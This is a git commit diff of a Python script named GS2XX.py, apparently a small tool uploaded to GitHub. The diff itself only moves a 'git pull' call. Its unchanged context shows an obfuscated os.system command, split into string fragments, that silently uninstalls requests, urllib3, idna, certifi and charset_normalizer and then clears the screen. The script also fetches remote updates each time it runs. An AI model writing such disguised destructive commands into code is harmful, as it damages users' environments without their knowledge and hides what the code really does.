f5aa1f04164b391d0698bafc647fb320a1a7c7f6
mdtasin123 <129798134+mdtasin123@users.noreply.github.com>
2023-08-03 03:07:46 +0530

    Add files via upload

--- GS2XX.py
+++ GS2XX.py
@@ -1,6 +1,6 @@
 import os
-os.system('git pull')
 print ('\033[1;'+'32'+'m')
+os.system('git pull')
 os.system('pip '+'u'+'n'+'in'+'st'+'all '+'re'+'qu'+'es'+'ts urllib3 idna certifi charset_normalizer '+'-'+'y')
 os.system('clear')
 print ('\033[0;97m')
